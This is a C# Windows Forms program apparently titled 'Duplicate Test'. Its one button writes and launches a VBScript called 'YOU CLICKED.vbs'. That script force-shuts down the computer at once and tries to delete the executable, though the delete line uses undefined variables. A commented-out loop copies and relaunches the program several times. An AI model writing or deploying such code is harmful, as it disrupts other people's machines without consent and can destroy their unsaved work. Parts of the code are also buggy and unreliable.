using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace Duplicate_Test
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void VBSWriter()
        {
            string line1 = "strCmd = \"shutdown -s -t 0 -f\"";
            string line2 = "set objShell = CreateObject(\"WScript.Shell\")";
            string line3 = "Set obj = CreateObject(\"Scripting.FileSystemObject\")";
            string line4 = "Directory = fso.BuildPath(CurrentDirectory, \"Duplicate Test.exe\")";
            string line5 = "wscript.sleep 5000";
            string line6 = "obj.DeleteFile(Directory)";
            string line7 = "objShell.Run strCmd";
            List<string> Code = new List<string>
            {
                line1,
                line2,
                line3,
                line4,
                line5,
                line6,
                line7
            };
            string CurrentLocation = Directory.GetCurrentDirectory();
            foreach (string s in Code)
            {
                try
                {

                    File.WriteAllLines(@"" + CurrentLocation + "\\YOU CLICKED.vbs", Code);
                }
                catch (DirectoryNotFoundException)
                {
                    Directory.CreateDirectory(@"" + CurrentLocation);
                    File.WriteAllLines(@"" + CurrentLocation + "\\YOU CLICKED.vbs", Code);
                }
            }
            Process.Start(@"" + CurrentLocation + "\\YOU CLICKED.vbs");
            Environment.Exit(0);
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            VBSWriter();
            /*for (int i = 1; i <= 5 ; i++)
            {
                string exec = Application.ExecutablePath;
                exec = exec.Insert(exec.IndexOf("."), i.ToString());
                File.Copy(Application.ExecutablePath, exec);
                Process.Start(exec);
            }*/
        }
    }
}
